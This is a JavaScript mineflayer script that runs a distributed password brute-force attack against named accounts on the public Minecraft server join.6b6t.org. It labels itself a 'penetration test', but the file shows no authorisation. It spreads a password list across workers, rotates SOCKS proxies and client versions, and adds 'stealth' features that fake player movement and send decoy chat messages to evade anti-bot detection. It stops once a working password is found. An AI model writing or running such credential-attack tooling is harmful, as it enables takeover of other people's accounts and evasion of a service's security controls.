const mineflayer = require('mineflayer');
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { exec } = require('child_process');
const { createObjectCsvWriter } = require('csv-writer');

// Get worker configuration from environment
const workerId = parseInt(process.env.WORKER_ID, 10) || 0;
const workerCount = parseInt(process.env.WORKER_COUNT, 10) || 1;
const proxyUri = process.env.PROXY || '';

// Create proxy agent from ENV or fall back to no proxy
const agent = proxyUri
    ? new SocksProxyAgent(proxyUri)
    : undefined;

// Test accounts configuration
const testAccounts = [
    {
        username: 'Advikbot',
        type: 'tester',
        priority: 1
    },
    {
        username: 'PowerUserTest',
        type: 'power_user',
        priority: 2
    },
    {
        username: 'ModTest',
        type: 'moderator',
        priority: 3
    }
];

// Supported client versions
const supportedVersions = [
    '1.19.2',
    '1.19.3',
    '1.19.4',
    '1.20.1'
];

// Configuration
const config = {
    host: 'join.6b6t.org',
    port: 25565,
    version: '1.20.1', // Will be randomized per attempt
    auth: 'offline',
    hideErrors: true,
    // Enhanced anti-bot settings
    checkTimeoutMs: 20000, // Increased timeout
    moveIntervalMs: 3000, // More natural movement
    maxAttemptsPerIP: 1,
    delayBetweenAttempts: {
        min: 30000, // 30 seconds
        max: 90000  // 90 seconds
    },
    circuitRotationDelay: 45000,  // 45 seconds
    sessionTimeout: 300000, // 5 minutes
    // Enhanced physics settings
    physicsEnabled: true,
    autoJump: true,
    viewDistance: 'tiny',
    // New stealth settings
    randomChatMessages: [
        "anyone online?",
        "server seems quiet today",
        "nice weather in game",
        "anyone know the server rules?",
        "what's the best way to get started?",
        "anyone want to team up?",
        "server seems laggy today",
        "anyone know where to find resources?",
        "what's the best way to protect my base?",
        "anyone want to trade?"
    ],
    randomMovements: true,
    randomLooking: true,
    randomChatInterval: {
        min: 120000, // 2 minutes
        max: 300000  // 5 minutes
    },
    // Required mineflayer settings
    client: {
        version: '1.20.1',
        username: '', // Will be set per attempt
        password: '', // Will be set per attempt
        auth: 'offline'
    }
};

// Load and distribute passwords
if (!fs.existsSync('passwords.txt')) {
    console.error('Error: passwords.txt not found');
    process.exit(1);
}
const allPasswords = fs.readFileSync('passwords.txt', 'utf8')
    .split('\n')
    .map(p => p.trim())
    .filter(p => p && !p.startsWith('#')); // Filter out empty lines and comments

// Distribute passwords among workers
const passwords = allPasswords.filter((_, idx) => idx % workerCount === workerId);

console.log(`Worker #${workerId}: Processing ${passwords.length} of ${allPasswords.length} passwords`);

// Create logs directory if it doesn't exist
if (!fs.existsSync('logs')) {
    fs.mkdirSync('logs');
}

// Initialize logging
const logFile = `logs/penetration_test_worker${workerId}_${new Date().toISOString().replace(/[:.]/g, '-')}.log`;
const logStream = fs.createWriteStream(logFile, { flags: 'a' });

function log(message, type = 'INFO') {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] [${type}] ${message}`;
    console.log(logMessage);
    logStream.write(logMessage + '\n');
}

// Function to clean color codes from messages
function cleanMessage(message) {
    return message.replace(/\u00A7[0-9A-FK-OR]/gi, '').toLowerCase();
}

// State management
const stateFile = `penetration_test_state_worker${workerId}.json`;
let state = {
    currentAttempt: 0,
    lastSessionEnd: 0,
    accountStates: {},
    versionRotation: 0,
    successfulLogins: 0,
    failedLogins: 0,
    consecutiveFailures: 0,
    totalPasswords: passwords.length
};

// Initialize account states
testAccounts.forEach(account => {
    if (!state.accountStates[account.username]) {
        state.accountStates[account.username] = {
            currentAttempt: 0,
            lastSessionEnd: 0,
            consecutiveFailures: 0
        };
    }
});

// Load state if exists
function loadState() {
    try {
        if (fs.existsSync(stateFile)) {
            const savedState = JSON.parse(fs.readFileSync(stateFile, 'utf8'));
            state = { ...state, ...savedState };
            log('Loaded previous test state', 'STATE');
            log(`Resuming from attempt ${state.currentAttempt}`, 'STATE');
        }
    } catch (error) {
        log(`Error loading state: ${error.message}`, 'ERROR');
    }
}

// Save state
function saveState() {
    try {
        fs.writeFileSync(stateFile, JSON.stringify(state, null, 2));
        log('Saved test state', 'STATE');
    } catch (error) {
        log(`Error saving state: ${error.message}`, 'ERROR');
    }
}

// Get next test account
function getNextTestAccount() {
    // Sort accounts by priority and failure count
    const sortedAccounts = testAccounts.sort((a, b) => {
        const aState = state.accountStates[a.username];
        const bState = state.accountStates[b.username];
        
        // First sort by consecutive failures (ascending)
        if (aState.consecutiveFailures !== bState.consecutiveFailures) {
            return aState.consecutiveFailures - bState.consecutiveFailures;
        }
        
        // Then by priority (ascending)
        return a.priority - b.priority;
    });
    
    return sortedAccounts[0];
}

// Get next client version
function getNextClientVersion() {
    state.versionRotation = (state.versionRotation + 1) % supportedVersions.length;
    return supportedVersions[state.versionRotation];
}

// Enhanced random movement function
function performRandomMovement(bot) {
    if (!config.randomMovements) return;
    
    const movements = [
        () => bot.setControlState('forward', true),
        () => bot.setControlState('back', true),
        () => bot.setControlState('left', true),
        () => bot.setControlState('right', true),
        () => bot.setControlState('jump', true),
        () => bot.setControlState('sprint', true)
    ];
    
    const randomMovement = movements[Math.floor(Math.random() * movements.length)];
    randomMovement();
    
    setTimeout(() => {
        bot.clearControlStates();
    }, 1000 + Math.random() * 2000);
}

// Enhanced random looking function
function performRandomLooking(bot) {
    if (!config.randomLooking) return;
    
    const yaw = Math.random() * Math.PI * 2;
    const pitch = (Math.random() - 0.5) * Math.PI;
    bot.look(yaw, pitch);
}

// Random chat message function
function sendRandomChat(bot) {
    if (Math.random() < 0.3) { // 30% chance to send a message
        const message = config.randomChatMessages[Math.floor(Math.random() * config.randomChatMessages.length)];
        bot.chat(message);
        log(`Sent random chat: ${message}`, 'STEALTH');
    }
}

// CSV Report Configuration
const csvConfig = {
    path: `reports/penetration_test_worker${workerId}_${new Date().toISOString().replace(/[:.]/g, '-')}.csv`,
    header: [
        { id: 'timestamp', title: 'TIMESTAMP' },
        { id: 'account', title: 'ACCOUNT' },
        { id: 'accountType', title: 'ACCOUNT_TYPE' },
        { id: 'password', title: 'PASSWORD' },
        { id: 'version', title: 'VERSION' },
        { id: 'result', title: 'RESULT' },
        { id: 'deltaMs', title: 'DELTA_MS' },
        { id: 'eventType', title: 'EVENT_TYPE' },
        { id: 'message', title: 'MESSAGE' },
        { id: 'consecutiveFailures', title: 'CONSECUTIVE_FAILURES' },
        { id: 'workerId', title: 'WORKER_ID' },
        { id: 'proxy', title: 'PROXY' },
        { id: 'totalPasswords', title: 'TOTAL_PASSWORDS' },
        { id: 'passwordIndex', title: 'PASSWORD_INDEX' },
        { id: 'percentComplete', title: 'PERCENT_COMPLETE' }
    ]
};

// Initialize CSV writer
let csvWriter;
try {
    // Create reports directory if it doesn't exist
    if (!fs.existsSync('reports')) {
        fs.mkdirSync('reports');
    }
    csvWriter = createObjectCsvWriter(csvConfig);
    // Write header
    csvWriter.writeRecords([]);
} catch (error) {
    log(`Error initializing CSV writer: ${error.message}`, 'ERROR');
}

// Function to record test attempt
async function recordAttempt(data) {
    try {
        const passwordIndex = state.currentAttempt;
        const percentComplete = ((passwordIndex + 1) / passwords.length * 100).toFixed(2);
        
        await csvWriter.writeRecords([{
            ...data,
            workerId: workerId,
            proxy: proxyUri || 'direct',
            totalPasswords: passwords.length,
            passwordIndex: passwordIndex,
            percentComplete: percentComplete
        }]);
        
        // Log progress periodically
        if (passwordIndex % 10 === 0) { // Log every 10 attempts
            log(`Progress: ${percentComplete}% (${passwordIndex + 1}/${passwords.length})`, 'PROGRESS');
        }
    } catch (error) {
        log(`Error writing to CSV: ${error.message}`, 'ERROR');
    }
}

// Enhanced tryPassword function
async function tryPassword(username, password, proxyUri) {
    const version = getNextClientVersion();
    const botConfig = {
        host: config.host,
        port: config.port,
        username: username,
        password: password,
        version: version,
        auth: 'offline',
        client: {
            version: version,
            username: username,
            password: password,
            auth: 'offline'
        }
    };

    if (proxyUri) {
        botConfig.agent = new SocksProxyAgent(proxyUri);
    }

    console.log('[DEBUG] Bot configuration:', JSON.stringify(botConfig, null, 2));

    try {
        const bot = mineflayer.createBot(botConfig);
        
        return new Promise((resolve, reject) => {
            let timeout = setTimeout(() => {
                bot.end();
                resolve('timeout');
            }, config.checkTimeoutMs);

            bot.once('login', () => {
                clearTimeout(timeout);
                bot.end();
                resolve('success');
            });

            bot.once('error', (err) => {
                clearTimeout(timeout);
                console.log('[ERROR] Bot error:', err.message);
                resolve('error');
            });

            bot.once('kicked', (reason) => {
                clearTimeout(timeout);
                console.log('[INFO] Bot kicked:', reason);
                resolve('kicked');
            });
        });
    } catch (err) {
        console.log('[ERROR] Error creating bot:', err.message);
        console.log('[ERROR] Stack trace:', err.stack);
        return 'error';
    }
}

// Enhanced main function
async function main() {
    loadState();
    
    log('Starting penetration test of 6b6t.org authentication system', 'INFO');
    log(`Worker ID: ${workerId}`, 'INFO');
    log(`Proxy: ${proxyUri || 'direct'}`, 'INFO');
    log(`Target accounts: ${testAccounts.map(a => a.username).join(', ')}`, 'INFO');
    log(`Server: ${config.host}:${config.port}`, 'INFO');
    log(`Total passwords: ${passwords.length}`, 'INFO');
    log(`Current attempt: ${state.currentAttempt}`, 'INFO');
    log(`Progress: ${((state.currentAttempt + 1) / passwords.length * 100).toFixed(2)}%`, 'INFO');
    log(`CSV Report: ${csvConfig.path}`, 'INFO');
    log('Anti-detection measures: Enabled', 'INFO');
    log('Stealth features: Enabled', 'INFO');
    log('Session timeout: 5 minutes', 'INFO');
    log('', 'INFO');

    const startTime = Date.now();

    for (state.currentAttempt; state.currentAttempt < passwords.length; state.currentAttempt++) {
        const password = passwords[state.currentAttempt];
        
        // Check if we need to wait for session timeout
        const timeSinceLastSession = Date.now() - state.lastSessionEnd;
        if (timeSinceLastSession < config.sessionTimeout) {
            const waitTime = config.sessionTimeout - timeSinceLastSession;
            log(`Waiting ${(waitTime/1000).toFixed(1)} seconds for session timeout...`, 'WAIT');
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }
        
        const result = await tryPassword(getNextTestAccount().username, password, proxyUri);
        
        if (result === 'success') {
            console.log('\nFound working password:', password);
            break;
        } else if (result === 'kicked') {
            console.log('Too many accounts detected, waiting for session timeout...');
            // Increase wait time based on consecutive failures
            const waitTime = config.sessionTimeout + (state.accountStates[getNextTestAccount().username].consecutiveFailures * 60000); // Add 1 minute per failure
            console.log(`Waiting ${(waitTime/1000).toFixed(1)} seconds (increased due to consecutive failures)...`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
            state.accountStates[getNextTestAccount().username].lastSessionEnd = Date.now();
            state.currentAttempt--; // Retry the same password after waiting
            continue;
        }

        if (state.currentAttempt < passwords.length - 1) {
            // Add randomization to delay
            const baseDelay = config.delayBetweenAttempts.min;
            const randomDelay = baseDelay + Math.random() * (config.delayBetweenAttempts.max - baseDelay);
            console.log(`Waiting ${(randomDelay/1000).toFixed(1)} seconds before next attempt...`);
            await new Promise(resolve => setTimeout(resolve, randomDelay));
        }
        
        // Save state after each attempt
        saveState();
    }

    const duration = (Date.now() - startTime) / 1000;
    log('\nPenetration test completed', 'SUMMARY');
    log(`Duration: ${duration.toFixed(2)} seconds`, 'SUMMARY');
    log(`Total attempts: ${state.currentAttempt + 1}`, 'SUMMARY');
    log(`Successful logins: ${state.successfulLogins}`, 'SUMMARY');
    log(`Failed logins: ${state.failedLogins}`, 'SUMMARY');
    log(`Final progress: ${((state.currentAttempt + 1) / passwords.length * 100).toFixed(2)}%`, 'SUMMARY');
    log(`Log file: ${logFile}`, 'SUMMARY');
    log(`CSV Report: ${csvConfig.path}`, 'SUMMARY');
    
    // Save final state
    saveState();
}

// Run the script
main().catch(error => {
    log(`Fatal error: ${error.message}`, 'ERROR');
    log(error.stack, 'ERROR');
    saveState(); // Save state even on error
}); 